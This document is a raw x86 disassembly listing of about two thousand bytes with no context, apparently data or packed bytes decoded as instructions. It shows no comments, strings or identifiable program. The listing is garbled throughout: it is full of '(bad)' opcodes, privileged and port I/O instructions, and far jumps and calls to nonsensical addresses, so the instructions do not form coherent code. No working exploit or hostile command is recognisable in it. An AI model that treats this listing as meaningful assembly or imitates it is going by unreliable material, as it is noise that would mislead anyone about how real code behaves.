  423ca2:	mov    ds:0x93f2f3c3,eax
  423ca7:	xchg   ebx,eax
  423ca8:	ja     0x423c40
  423caa:	int    0x27
  423cac:	mov    ebp,0xe8824f7a
  423cb1:	std    
  423cb2:	or     esp,ebp
  423cb4:	mov    eax,0x6752c990
  423cb9:	jecxz  0x423c6d
  423cbb:	add    bh,ah
  423cbd:	mov    eax,0x194b44bd
  423cc2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423cc3:	mov    BYTE PTR [di],ch
  423cc6:	cli    
  423cc7:	mov    ebp,0x73189f68
  423ccc:	add    eax,0x7370ca47
  423cd1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423cd2:	mov    al,ds:0xeff54fbf
  423cd7:	imul   esp,DWORD PTR [edx-0x2e2ea9cc],0x9ff816f3
  423ce1:	sub    ebp,DWORD PTR [edx]
  423ce3:	jge    0x423ce1
  423ce5:	mov    ebp,0x4c3cc33e
  423ceb:	and    eax,0x16272871
  423cf0:	adc    eax,0x25c47065
  423cf5:	aad    0x9b
  423cf7:	test   BYTE PTR [edi],bh
  423cf9:	iret   
  423cfa:	dec    ebp
  423cfb:	sti    
  423cfc:	jnp    0x423d74
  423cfe:	rcl    BYTE PTR [edi-0x70460577],1
  423d04:	in     al,dx
  423d05:	lock sar BYTE PTR [edi],0xaf
  423d09:	js     0x423cff
  423d0b:	rcr    DWORD PTR [ecx],0x6f
  423d0e:	mov    esp,0xd5928dfd
  423d13:	sbb    BYTE PTR [ecx+0x200000],dh
  423d19:	dec    ecx
  423d1a:	inc    esp
  423d1b:	inc    ecx
  423d1c:	push   esp
  423d1d:	sahf   
  423d1e:	push   0xffffffee
  423d20:	pushf  
  423d21:	dec    edx
  423d22:	minps  xmm4,XMMWORD PTR [edi+0x21]
  423d26:	mov    esi,0x40131594
  423d2b:	lock scas al,BYTE PTR es:[edi]
  423d2d:	into   
  423d2e:	adc    eax,0xf0c67756
  423d33:	cld    
  423d34:	mov    ecx,0x5114c686
  423d39:	fs push edx
  423d3b:	dec    edi
  423d3c:	mov    eax,0xb8dbc6eb
  423d41:	lock mov cl,0x86
  423d44:	jmp    0x8ed88c35
  423d49:	sub    eax,0xbbb9f873
  423d4e:	stc    
  423d4f:	fadd   st(3),st
  423d51:	dec    edi
  423d52:	jo     0x423d51
  423d54:	aaa    
  423d55:	dec    edi
  423d56:	mov    dl,0xf4
  423d58:	call   0x7827b134
  423d5d:	add    ah,bh
  423d5f:	push   edi
  423d60:	dec    edi
  423d61:	mov    eax,ds:0xad2fe951
  423d66:	mov    edx,0xf5bf4abe
  423d6b:	mov    esp,0x6c55f9f2
  423d70:	das    
  423d71:	dec    eax
  423d72:	add    DWORD PTR [edx+edi*4+0x74],ebx
  423d76:	dec    ecx
  423d77:	pop    edi
  423d78:	not    DWORD PTR [edi-0x56f9e0b1]
  423d7e:	test   DWORD PTR [edi-0x20e9aeca],0xc99fc22e
  423d88:	xor    al,0x29
  423d8a:	push   ds
  423d8b:	(bad)  
  423d8c:	add    bh,ah
  423d8e:	(bad)  
  423d8f:	daa    
  423d90:	sti    
  423d91:	pop    ebp
  423d92:	nop
  423d93:	rcl    BYTE PTR [ecx-0x9],0x60
  423d97:	clc    
  423d98:	xchg   edx,eax
  423d99:	add    bl,BYTE PTR [ebp+0x1b]
  423d9c:	imul   esp,edi,0x5d07542e
  423da2:	rol    DWORD PTR [ebx+0x5b],1
  423da5:	dec    edi
  423da6:	je     0x423d44
  423da8:	jnp    0x423d96
  423daa:	dec    edi
  423dab:	mov    dl,0xb6
  423dad:	mov    dl,0x6
  423daf:	add    al,0xa6
  423db1:	mov    bl,0x9a
  423db3:	int    0x9f
  423db5:	jg     0x423dc2
  423db7:	push   ebp
  423db8:	mov    ebp,0xbed8268a
  423dbd:	jp     0x423e1f
  423dbf:	or     DWORD PTR [ebx],ebp
  423dc1:	xor    DWORD PTR [ecx+0x67],eax
  423dc4:	xchg   ebx,eax
  423dc5:	fimul  WORD PTR [esp+edi*2]
  423dc8:	sub    dl,BYTE PTR [ebx]
  423dca:	push   ds
  423dcb:	jne    0x423d5f
  423dcd:	mov    esp,fs
  423dcf:	pop    ecx
  423dd0:	ins    BYTE PTR es:[edi],dx
  423dd1:	ss pop ecx
  423dd3:	sub    ebp,DWORD PTR [edi]
  423dd5:	js     0x423d68
  423dd7:	inc    esp
  423dd8:	dec    ecx
  423dd9:	ins    BYTE PTR es:[edi],dx
  423dda:	sub    DWORD PTR [ebp+edx*2-0x7bd935bf],esp
  423de1:	inc    ecx
  423de2:	adc    edx,DWORD PTR [edx+0x546e09a2]
  423de8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423de9:	repz arpl WORD PTR ds:0x12f424ab,dx
  423df0:	(bad)  
  423df1:	sti    
  423df2:	sub    al,0x5b
  423df4:	mov    ch,0xe8
  423df6:	mov    esi,0x7d2a73b3
  423dfb:	and    dh,ah
  423dfd:	pop    edx
  423dfe:	sbb    dh,BYTE PTR [edx+0x58]
  423e01:	cdq    
  423e02:	mov    al,0x65
  423e04:	nop
  423e05:	mov    DWORD PTR [ebx],ebp
  423e07:	es jmp 0xbc51cf9
  423e0d:	push   es
  423e0e:	popf   
  423e0f:	std    
  423e10:	xchg   esi,eax
  423e11:	in     al,0xcc
  423e13:	jnp    0x423db4
  423e15:	test   DWORD PTR [esi+0x5d],eax
  423e18:	xor    BYTE PTR [ebx+0x6c53079f],dl
  423e1e:	jno    0x423dd8
  423e20:	xchg   edi,eax
  423e21:	lods   al,BYTE PTR ds:[esi]
  423e22:	inc    esp
  423e23:	dec    esp
  423e24:	rcl    BYTE PTR [ebx+0x49],1
  423e27:	scas   eax,DWORD PTR es:[edi]
  423e28:	inc    ebp
  423e29:	mov    ds:0x1169e957,eax
  423e2e:	outs   dx,BYTE PTR ds:[esi]
  423e2f:	mov    DWORD PTR [edx-0x12],ebx
  423e32:	ins    DWORD PTR es:[edi],dx
  423e33:	sub    BYTE PTR [esi-0x6e28479f],bh
  423e39:	ror    ah,cl
  423e3b:	retf   0xc321
  423e3e:	icebp  
  423e3f:	pushf  
  423e40:	test   BYTE PTR [esi+eax*8+0x6ea3c8a5],dl
  423e47:	inc    ebp
  423e48:	mov    eax,0x1f663515
  423e4d:	das    
  423e4e:	jne    0x423e46
  423e50:	shl    dh,cl
  423e52:	ret    0xe8d9
  423e55:	pusha  
  423e56:	stc    
  423e57:	cmp    eax,0xf8a43684
  423e5c:	test   cx,sp
  423e5f:	ret    0x7d9f
  423e62:	call   FWORD PTR [edx+eiz*8]
  423e65:	enter  0xe8b3,0x39
  423e69:	ret    0x423f
  423e6c:	pop    ebx
  423e6d:	data16 int 0x0
  423e70:	push   0x2fd31526
  423e75:	fisttp QWORD PTR [edi+0x7a]
  423e78:	loopne 0x423e67
  423e7a:	ins    BYTE PTR es:[edi],dx
  423e7b:	std    
  423e7c:	mov    bl,0x6f
  423e7e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423e7f:	jg     0x423e6d
  423e81:	push   ebp
  423e82:	fdivr  QWORD PTR [ebp-0x1e]
  423e85:	cs jb  0x423e93
  423e88:	ja     0x423e17
  423e8a:	jbe    0x423ecb
  423e8c:	jge    0x423e95
  423e8e:	jge    0x423e3a
  423e90:	lods   al,BYTE PTR ds:[esi]
  423e91:	mov    esi,0x499cc64
  423e96:	icebp  
  423e97:	jle    0x423e9a
  423e99:	sbb    DWORD PTR [eax+0x7b23280c],esp
  423e9f:	mov    ebp,DWORD PTR [edi-0x43]
  423ea2:	out    0x8d,eax
  423ea4:	cmp    al,0x71
  423ea6:	jmp    0x5e59e4b4
  423eab:	iret   
  423eac:	fidiv  DWORD PTR fs:[eax-0x4]
  423eb0:	les    esp,FWORD PTR [edx]
  423eb2:	jne    0x423e91
  423eb4:	xor    cl,bh
  423eb6:	cmc    
  423eb7:	not    eax
  423eb9:	sbb    al,0x9c
  423ebb:	arpl   dx,dx
  423ebd:	add    al,0xe2
  423ebf:	shr    ebx,cl
  423ec1:	enter  0xcf97,0x99
  423ec5:	imul   esi,esp,0xffffffec
  423ec8:	or     DWORD PTR [eax-0x2e],eax
  423ecb:	addr16 ds cli 
  423ece:	xlat   BYTE PTR ds:[ebx]
  423ecf:	pop    edi
  423ed0:	xor    al,0x7
  423ed2:	lock cmp BYTE PTR [ebx],0x2
  423ed6:	(bad)  
  423ed8:	pop    ebp
  423ed9:	fbld   TBYTE PTR [ebp-0x2fa2aaab]
  423edf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423ee0:	call   0xde2f:0x2101e257
  423ee7:	popa   
  423ee8:	fiadd  DWORD PTR [eax+0x18]
  423eeb:	lock cld 
  423eed:	lock fnsave [ecx-0x1b8c0a4]
  423ef4:	jg     0x423f05
  423ef6:	xlat   BYTE PTR ds:[ebx]
  423ef7:	and    bl,al
  423ef9:	aad    0xe2
  423efb:	call   0x42a:0x85147c3a
  423f02:	dec    esi
  423f03:	push   edi
  423f04:	div    DWORD PTR [edx-0xf]
  423f07:	test   eax,0xf47e9ceb
  423f0c:	(bad)  
  423f0d:	jb     0x423f01
  423f0f:	fdivr  DWORD PTR [edx]
  423f11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423f12:	xchg   edi,eax
  423f13:	dec    edi
  423f14:	xor    ebx,edi
  423f16:	adc    eax,0x12ad4fd6
  423f1b:	jmp    0x9f6a:0x3412d40a
  423f22:	push   0xeabac9aa
  423f27:	test   al,0x59
  423f29:	stos   DWORD PTR es:[edi],eax
  423f2a:	pop    esp
  423f2b:	jbe    0x423f77
  423f2d:	xchg   edx,eax
  423f2e:	xor    al,cl
  423f30:	inc    ebx
  423f31:	push   ss
  423f32:	test   al,ch
  423f34:	mov    ebp,0x9c137af1
  423f39:	sar    bl,1
  423f3b:	xor    esp,edi
  423f3d:	mov    DWORD PTR [ebp+0x7bc465ad],ebx
  423f43:	fyl2xp1 
  423f45:	fs (bad) 
  423f47:	jecxz  0x423f68
  423f49:	jg     0x423f3a
  423f4b:	push   ecx
  423f4c:	ror    DWORD PTR [esi+edx*1-0x57f5852c],1
  423f53:	or     ebx,DWORD PTR [ecx+0x23e42ef4]
  423f59:	sub    ebp,DWORD PTR [eax]
  423f5b:	pop    ecx
  423f5c:	mov    BYTE PTR [edx+0x4408892b],ah
  423f62:	outs   dx,DWORD PTR ds:[esi]
  423f63:	cmp    eax,0x3271f19e
  423f68:	push   edi
  423f69:	ret    0xf0fa
  423f6c:	fnstenv [ebx-0x1b]
  423f6f:	out    0x81,al
  423f71:	jbe    0x423fd1
  423f73:	dec    esp
  423f74:	dec    eax
  423f75:	bound  esi,QWORD PTR [edx-0x35]
  423f78:	pop    ds
  423f79:	pop    ebp
  423f7a:	and    DWORD PTR [edi+eiz*8+0x5a],esp
  423f7e:	retf   
  423f7f:	div    DWORD PTR [ecx+0x5]
  423f82:	and    DWORD PTR ds:0x967f35d5,esp
  423f88:	adc    eax,0x19b1f646
  423f8d:	(bad)  
  423f8e:	jo     0x423f11
  423f90:	xor    al,0x5
  423f92:	ss mov dl,0xba
  423f95:	call   0x61ddc1ea
  423f9a:	mov    eax,0xf48eb247
  423f9f:	sbb    BYTE PTR [ebp*1+0x163ae77],bl
  423fa6:	push   edi
  423fa7:	sbb    eax,DWORD PTR [ebx-0x3f460fbe]
  423fad:	xchg   BYTE PTR [di],bh
  423fb0:	aaa    
  423fb1:	push   ss
  423fb2:	leave  
  423fb3:	xlat   BYTE PTR ds:[ebx]
  423fb4:	mov    cl,0x73
  423fb6:	cli    
  423fb7:	jnp    0x423f7a
  423fb9:	(bad)  
  423fba:	push   esi
  423fbb:	mov    edi,0x944991d6
  423fc0:	push   esi
  423fc2:	fild   WORD PTR [ebx]
  423fc4:	daa    
  423fc5:	mov    al,ds:0x78d50936
  423fca:	and    BYTE PTR [esi+0x32],0x65
  423fce:	stc    
  423fcf:	clc    
  423fd0:	adc    ch,bl
  423fd2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423fd3:	mov    ?,WORD PTR [ecx-0x4e1b632c]
  423fd9:	(bad)  
  423fda:	cs xor ebx,ecx
  423fdd:	mov    esp,0xfdbbaf87
  423fe2:	imul   ebp,DWORD PTR [eax-0x271292be],0x1c
  423fe9:	mov    al,0x59
  423feb:	jns    0x423f79
  423fed:	mov    ebx,0x113a3871
  423ff2:	outs   dx,DWORD PTR ds:[esi]
  423ff3:	adc    esi,0x4cab2831
  423ff9:	mov    edx,0xb99df702
  423ffe:	mov    ecx,DWORD PTR [ebx]
  424000:	dec    edi
  424001:	in     al,dx
  424002:	rol    DWORD PTR [edi-0x42],0x11
  424006:	add    eax,0x406a9716
  42400b:	pop    ecx
  42400c:	aas    
  42400d:	jae    0x423f9b
  42400f:	cmc    
  424010:	rol    edi,cl
  424012:	cmp    DWORD PTR [esi+0x72],edi
  424015:	cdq    
  424016:	test   ebp,eax
  424018:	xchg   BYTE PTR [ecx-0x4d],cl
  42401b:	inc    eax
  42401c:	pop    edi
  42401d:	int    0xec
  42401f:	(bad)  
  424021:	push   ss
  424022:	or     DWORD PTR [ecx],esp
  424024:	hlt    
  424025:	mov    edi,0xc57ca487
  42402a:	fisttp DWORD PTR [ebx]
  42402c:	out    dx,eax
  42402d:	sub    esi,esi
  42402f:	cmp    DWORD PTR [edi],0xffffff88
  424032:	dec    eax
  424033:	cmc    
  424034:	push   eax
  424035:	cdq    
  424036:	or     cl,bl
  424038:	ret    0x6c05
  42403b:	popf   
  42403c:	cmp    eax,0x2f700577
  424041:	fld    DWORD PTR [esi]
  424043:	pop    eax
  424044:	or     bh,BYTE PTR [ebx+0x6d]
  424047:	call   FWORD PTR [esp+ebx*8]
  42404a:	add    eax,DWORD PTR [ebx]
  42404c:	or     al,0x32
  42404e:	cli    
  42404f:	pop    ss
  424050:	in     eax,0xb3
  424052:	and    ebx,DWORD PTR [ebx-0x2a468972]
  424058:	lea    edi,[ebp-0x3632322e]
  42405e:	cmp    eax,0x8385bddb
  424063:	daa    
  424064:	(bad)  
  424065:	jae    0x424042
  424067:	loop   0x424006
  424069:	rcl    BYTE PTR [esi-0x5c],1
  42406c:	pop    ebp
  42406d:	imul   ebx,DWORD PTR [ebp+0x6879b3be],0x24
  424074:	bound  edx,QWORD PTR [edx-0x16]
  424077:	dec    esp
  424078:	test   eax,0xd6d4e5b9
  42407d:	test   BYTE PTR [ebx],cl
  42407f:	xor    eax,0x59943deb
  424084:	fild   DWORD PTR [ebx+ebp*4+0x179aa64a]
  42408b:	mov    bh,0xb8
  42408d:	ret    0x8893
  424090:	mov    ebx,0xf4562001
  424095:	dec    ebp
  424096:	test   BYTE PTR [edi-0x661a4d35],0x79
  42409d:	dec    esi
  42409e:	mov    eax,edx
  4240a0:	(bad)  
  4240a1:	mov    dl,0xba
  4240a3:	(bad)  
  4240a4:	clc    
  4240a5:	inc    esp
  4240a6:	iret   
  4240a7:	jno    0x424095
  4240a9:	sub    al,0x80
  4240ab:	out    0xe,al
  4240ad:	cwde   
  4240ae:	nop
  4240af:	ror    DWORD PTR [edi],1
  4240b1:	push   ss
  4240b2:	sub    al,0x5f
  4240b4:	inc    edi
  4240b5:	mov    bl,0xcb
  4240b7:	mov    eax,ds:0xcfba96e
  4240bc:	loope  0x4240bb
  4240be:	ds pop esp
  4240c0:	imul   edx,DWORD PTR [ecx+0x1717d7cc],0x5209a0a4
  4240ca:	out    dx,eax
  4240cb:	out    dx,al
  4240cc:	dec    esi
  4240cd:	sub    dl,BYTE PTR [esi+0x1fa7cdb]
  4240d3:	xchg   ecx,eax
  4240d4:	push   0xd582141a
  4240d9:	sbb    al,0x64
  4240db:	retf   
  4240dc:	(bad)  
  4240de:	mov    edi,0x239200c0
  4240e3:	push   es
  4240e4:	inc    edi
  4240e5:	sbb    BYTE PTR [ebx+0x65],ah
  4240e8:	test   al,0xf9
  4240ea:	fnstenv [edx+0xbe12c62]
  4240f0:	pop    ss
  4240f1:	xchg   esp,eax
  4240f2:	in     al,dx
  4240f3:	xchg   edi,eax
  4240f4:	cmp    eax,ecx
  4240f6:	call   0x7ecc:0xcc54f7a2
  4240fd:	bnd jbe 0x42416a
  424100:	fidivr WORD PTR [ebp+esi*1-0x51]
  424104:	loop   0x424099
  424106:	pop    ss
  424107:	pushf  
  424108:	leave  
  424109:	push   ds
  42410a:	mov    eax,ds:0x65ab4c9
  42410f:	jecxz  0x424109
  424111:	pushf  
  424112:	jle    0x424121
  424114:	mov    ebp,DWORD PTR [esp+eiz*8+0x1452dd03]
  42411b:	and    al,0xa0
  42411d:	ds mov ebx,0x848c18f2
  424123:	fisttp WORD PTR [edx-0x662427eb]
  424129:	mov    cl,0xb3
  42412b:	jne    0x4240f5
  42412d:	out    dx,al
  42412e:	(bad)  
  42412f:	popa   
  424130:	test   eax,0xfa9f4bf4
  424135:	push   es
  424136:	sahf   
  424137:	cli    
  424138:	mov    ecx,0xccf93cf3
  42413d:	push   cs
  42413e:	outs   dx,DWORD PTR ds:[esi]
  42413f:	cmp    al,0xfb
  424141:	cmp    ch,BYTE PTR [edx]
  424143:	test   eax,0x5959d48
  424148:	fwait
  424149:	mov    esp,ecx
  42414b:	push   ss
  42414c:	pop    ds
  42414d:	mov    cl,0x3e
  42414f:	add    BYTE PTR [ebp-0x67b0dcb1],bh
  424155:	dec    edx
  424156:	into   
  424157:	leave  
  424158:	mov    al,al
  42415a:	bound  esi,QWORD PTR [ebx]
  42415c:	in     eax,0xc4
  42415e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42415f:	aaa    
  424160:	mov    cl,0xf1
  424162:	or     ebp,DWORD PTR [edi-0x29945160]
  424168:	dec    esi
  424169:	pop    ds
  42416a:	inc    ebx
  42416b:	inc    ebp
  42416c:	mov    eax,0xeb9b6576
  424171:	fwait
  424172:	mov    ebx,0x30ee6d6c
  424177:	fistp  DWORD PTR [edi-0x645d9d6d]
  42417d:	mov    bh,0xec
  42417f:	jmp    0xedd4573a
  424184:	sub    al,0x23
  424186:	and    DWORD PTR [eax+ebp*8+0x1178001c],edi
  42418d:	or     ah,al
  42418f:	pop    es
  424190:	fdivrp st(7),st
  424192:	lods   eax,DWORD PTR ds:[esi]
  424194:	stos   BYTE PTR es:[edi],al
  424195:	jmp    0x3457:0x94d51437
  42419c:	push   ebp
  42419d:	mov    edi,DWORD PTR [edx]
  42419f:	push   edi
  4241a0:	inc    ecx
  4241a1:	test   al,0xdc
  4241a3:	or     eax,0xe7a9eab0
  4241a8:	xor    ebx,ebp
  4241aa:	mov    edi,0x3e180c27
  4241af:	sbb    BYTE PTR [edx],bl
  4241b1:	pop    DWORD PTR [ebx]
  4241b3:	(bad)  
  4241b4:	jp     0x424201
  4241b6:	sub    ch,BYTE PTR [edx]
  4241b8:	neg    dh
  4241ba:	xchg   WORD PTR ds:0x6a61609a,bx
  4241c1:	ins    DWORD PTR es:[edi],dx
  4241c2:	shr    BYTE PTR [ebx-0xe831c03],cl
  4241c8:	ja     0x424188
  4241ca:	enter  0xdee6,0x9e
  4241ce:	sub    eax,0xe8612dc3
  4241d3:	nop
  4241d4:	xchg   ebx,eax
  4241d5:	xchg   esp,eax
  4241d6:	mov    al,ah
  4241d8:	inc    esp
  4241d9:	xchg   esi,ebp
  4241db:	mov    esp,0x644d1a68
  4241e0:	lahf   
  4241e1:	clc    
  4241e2:	add    eax,0xe05466ae
  4241e7:	push   ss
  4241e8:	pop    edx
  4241e9:	jae    0x424202
  4241eb:	and    bh,bh
  4241ed:	ja     0x4241f1
  4241ef:	mov    ds:0xdd14d35b,al
  4241f4:	cmp    BYTE PTR [ebx+0x204acee5],0x4f
  4241fb:	in     al,dx
  4241fc:	mov    BYTE PTR [ecx+0x5],dh
  4241ff:	(bad)  [edx]
  424201:	jnp    0x424231
  424203:	stos   DWORD PTR es:[edi],eax
  424204:	test   al,0x96
  424206:	jae    0x424216
  424208:	jns    0x4241b6
  42420a:	shr    DWORD PTR [ebp-0x34fa7710],1
  424210:	popf   
  424211:	and    BYTE PTR [edx+0x280a6742],0xe8
  424218:	pop    eax
  424219:	imul   esp,DWORD PTR [ebx+eiz*4+0x5326b33e],0xac8ad16c
  424224:	les    eax,FWORD PTR [ebp+0x21c62f2c]
  42422a:	(bad)  
  42422b:	pop    esp
  42422c:	inc    edi
  42422d:	adc    BYTE PTR [ebx-0x1a],cl
  424230:	adc    ecx,DWORD PTR [edx]
  424232:	adc    dh,BYTE PTR [eax-0x48]
  424235:	fxrstor [eax+0x22963f0]
  42423c:	dec    esi
  42423d:	test   cl,0xb3
  424240:	jne    0x424211
  424242:	jl     0x424244
  424244:	adc    ebp,0x56
  424247:	mov    dl,0x1f
  424249:	sahf   
  42424a:	fmul   st(2),st
  42424c:	pop    ebx
  42424d:	xchg   edi,eax
  42424e:	mov    ds:0xf9f15294,eax
  424253:	jae    0x4241f4
  424255:	(bad)
  424258:	xchg   ebp,eax
  424259:	pop    esp
  42425a:	jg     0x4242db
  42425c:	push   ds
  42425d:	mov    edx,DWORD PTR [ebp+0x1427c0cb]
  424263:	lds    ebx,FWORD PTR [ecx+0x41590423]
  424269:	in     al,0x62
  42426b:	and    al,0x1d
  42426d:	or     DWORD PTR [edi+0x479e4fdd],edi
  424273:	ss mov ebx,0x92e3e0b2
  424279:	and    BYTE PTR [edi-0x6c],al
  42427c:	test   al,bh
  42427e:	xor    DWORD PTR [ebp+0x67],edi
  424281:	stc    
  424282:	rol    edi,1
  424284:	(bad)  
  424285:	xchg   esi,eax
  424286:	pop    ecx
  424287:	pop    edx
  424288:	pop    ecx
  424289:	pusha  
  42428a:	jb     0x424279
  42428c:	xchg   ebp,eax
  42428d:	fdiv   st(0),st
  42428f:	shr    DWORD PTR [edi-0x1b],1
  424292:	jmp    0xe0c1561e
  424297:	mov    dh,0x37
  424299:	clc    
  42429a:	mov    ebp,0xd5253850
  42429f:	loopne 0x424249
  4242a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4242a2:	and    cl,BYTE PTR [edx-0x3518042b]
  4242a8:	fisttp QWORD PTR [edx-0x6b]
  4242ab:	fimul  DWORD PTR [ebx]
  4242ad:	rcr    DWORD PTR [esi+0x75],0xea
  4242b1:	dec    esi
  4242b2:	cs pop edi
  4242b4:	(bad)  [eax-0x57]
  4242b7:	mov    edi,0x5d5e587
  4242bc:	cli    
  4242bd:	ds mov cl,0x7d
  4242c0:	jge    0x424299
  4242c2:	ret    0x4e40
  4242c5:	sbb    dh,BYTE PTR [edi]
  4242c7:	dec    ebp
  4242c8:	inc    ebp
  4242c9:	fcomip st,st(5)
  4242cb:	push   esp
  4242cc:	or     ebx,DWORD PTR ds:0xb2cf4b3b
  4242d2:	mov    dl,0xb8
  4242d4:	or     al,0xb3
  4242d6:	and    eax,0xa2f266aa
  4242db:	loope  0x42431c
  4242dd:	mov    esp,0x1204498
  4242e2:	ficom  WORD PTR [eax+0x7f]
  4242e5:	fcmovu st,st(0)
  4242e7:	movaps XMMWORD PTR [edx+0x4eb6543f],xmm3
  4242ee:	mov    edx,0x8110a154
  4242f3:	push   es
  4242f4:	(bad)  
  4242f5:	outs   dx,BYTE PTR ds:[esi]
  4242f6:	and    al,BYTE PTR [ebx]
  4242f8:	jne    0x42433a
  4242fa:	add    edi,DWORD PTR [edi-0x1adfe441]
  424300:	xchg   ebp,eax
  424301:	or     ebp,0x52e6b1bd
  424307:	pusha  
  424308:	ds out dx,eax
  42430a:	pop    eax
  42430b:	dec    edx
  42430c:	push   ebx
  42430d:	jbe    0x424385
  42430f:	mov    dh,0x8
  424311:	imul   DWORD PTR [edi+0x20]
  424314:	and    DWORD PTR [eax-0x3d3c4f83],esi
  42431a:	push   edx
  42431b:	mov    ds:0x155512ef,al
  424320:	call   0xb9987060
  424325:	stos   BYTE PTR es:[edi],al
  424326:	test   DWORD PTR [esi],eax
  424328:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424329:	int    0x5
  42432b:	sub    al,cl
  42432d:	xchg   ebx,eax
  42432e:	loopne 0x424343
  424330:	dec    eax
  424331:	gs test eax,0x52b21698
  424337:	jb     0x4242c5
  424339:	dec    esp
  42433a:	les    ebp,FWORD PTR [esi-0x196bbc63]
  424340:	mov    ?,eax
  424342:	pop    ds
  424343:	loop   0x42430f
  424345:	add    BYTE PTR [ebx+edi*2],bh
  424348:	push   ebx
  424349:	(bad)  
  42434a:	in     eax,dx
  42434b:	cmc    
  42434c:	test   DWORD PTR [ecx-0x4d],edx
  42434f:	and    dl,BYTE PTR [esp+edx*4+0x7cae896c]
  424356:	lods   eax,DWORD PTR ds:[esi]
  424357:	loop   0x42431c
  424359:	clc    
  42435a:	mov    ch,0xc2
  42435c:	rcr    BYTE PTR [ebx+0x159930f8],0xf
  424363:	ds push edx
  424365:	loop   0x424398
  424367:	jle    0x4243da
  424369:	pop    ds
  42436a:	ffreep st(3)
  42436c:	lea    ebx,[ecx+0x31]
  42436f:	data16 or al,0x65
  424372:	jbe    0x4243a1
  424374:	pop    edx
  424375:	xor    dh,cl
  424377:	mov    ds:0x3da66309,eax
  42437c:	in     al,0x58
  42437e:	pop    eax
  42437f:	jg     0x4243f5
  424381:	mov    eax,0x165d3fb3
  424386:	cmp    eax,0x1294e2f2
  42438b:	bound  esi,QWORD PTR [ebx+0x2b]
  42438e:	test   eax,0x3716864e
  424393:	sub    al,0xe5
  424395:	jnp    0x4243eb
  424397:	btr    DWORD PTR [ebp+0xd],esp
  42439b:	in     eax,dx
  42439c:	mov    esi,0x18bf866f
  4243a1:	stc    
  4243a2:	pop    eax
  4243a3:	ficom  DWORD PTR [edi+eax*8+0x4f8571d1]
  4243aa:	enter  0x8adc,0x2b
  4243ae:	add    eax,0xd26d94c
  4243b3:	inc    ebx
  4243b4:	mov    eax,0x487ec7cf
  4243b9:	push   es
  4243ba:	sbb    bh,cl
  4243bc:	cld    
  4243bd:	dec    esi
  4243be:	push   es
  4243bf:	push   ds
  4243c0:	cdq    
  4243c1:	jb     0x42441c
  4243c3:	rcr    BYTE PTR [edi-0x300e07b1],1
  4243c9:	mov    bl,0x92
  4243cb:	sub    bl,ah
  4243cd:	call   0xb5f2ce99
  4243d2:	jns    0x424394
  4243d4:	shl    BYTE PTR [edx-0x3d],cl
  4243d7:	ror    dl,cl
  4243d9:	test   cl,cl
  4243db:	(bad)
  4243e0:	sti    
  4243e1:	lahf   
  4243e2:	jg     0x424407
  4243e4:	ja     0x4243e2
  4243e6:	xchg   DWORD PTR [ebx],ebx
  4243e8:	dec    esp
  4243e9:	es psrld mm6,mm6
  4243ed:	jae    0x4243c3
  4243ef:	fwait
  4243f0:	xor    eax,0x256374e6
  4243f5:	push   edx
  4243f6:	sti    
  4243f7:	cwde   
  4243f8:	dec    ebx
  4243f9:	add    eax,0x9f9c2261
  4243fe:	scas   al,BYTE PTR es:[edi]
  4243ff:	mov    bl,0xda
  424401:	sbb    al,0x63
  424403:	mov    dl,0xb8
  424405:	dec    eax
  424406:	js     0x4243ee
  424408:	jle    0x4243a8
  42440a:	clc    
  42440b:	inc    esp
  42440c:	int    0x82
  42440e:	pop    eax
  42440f:	pop    eax
  424410:	clc    
  424411:	jo     0x424482
  424413:	xchg   BYTE PTR [edi],al
  424415:	fwait
  424416:	test   al,0x3c
  424418:	bound  edx,QWORD PTR [ecx+ecx*4+0x30]
  42441c:	fwait
  42441d:	cmc    
  42441e:	lods   al,BYTE PTR ds:[esi]
  42441f:	sahf   
  424420:	or     eax,0x2af5743c
  424425:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424426:	dec    esi
  424427:	scas   eax,DWORD PTR es:[edi]
  424428:	xor    ebx,DWORD PTR [ebx-0x252026b1]
  42442e:	std    
  42442f:	push   ebp
  424430:	outs   dx,BYTE PTR ds:[esi]
  424431:	shl    esi,0x82
  424434:	adc    eax,eax
  424436:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424437:	dec    ebx
  424438:	sbb    edi,DWORD PTR [edx]
  42443a:	pop    ebp
  42443b:	cdq    
  42443c:	cmp    al,0xa8
  42443e:	dec    ecx
  42443f:	dec    edx
  424440:	xchg   ebx,eax
  424441:	cmp    DWORD PTR [ebp+0x13],edx
  424444:	mov    ss,WORD PTR [eax+0x59]
  424447:	sub    BYTE PTR [eax],dh
  424449:	in     al,0x25
  42444b:	mov    ch,0x6f
  42444d:	mov    ds:0xff39e401,al
  424452:	mov    al,ds:0xd471a4bc
  424457:	mov    al,ds:0xf4725fc
  42445c:	mov    bl,0xd2
  42445e:	(bad)  
  42445f:	retf   0x1d04
  424462:	sub    esi,esi
  424464:	sahf   
  424465:	inc    ebx
  424466:	dec    esi
  424467:	jle    0x42444c
  424469:	adc    eax,0x77d72834
  42446e:	scas   eax,DWORD PTR es:[edi]
  42446f:	mov    cl,0x74
  424471:	sub    al,0xd0
  424473:	int    0x3b
  424475:	push   ss
  424476:	xchg   edi,eax
  424477:	sbb    cl,bl
  424479:	cli    
  42447a:	sub    eax,0x60d29ec4
  42447f:	aas    
  424480:	cdq    
  424481:	and    DWORD PTR [esi+0x27d2fdb3],0xbeeb9d6b
  42448b:	mov    edi,0xd493b138
  424490:	jns    0x424492
  424492:	jne    0x4244df
  424494:	push   ebp
  424495:	pop    edx
  424496:	jcxz   0x4244ef
  424499:	nop
  42449a:	bound  ecx,QWORD PTR [ecx+0x35]
  42449d:	pop    ss
  42449e:	repz pop ss
  4244a0:	dec    eax
  4244a1:	popf   
  4244a2:	std    
  4244a3:	ins    DWORD PTR es:[edi],dx
  4244a4:	or     al,0xba
  4244a6:	pop    ss
  4244a7:	add    al,0xe1
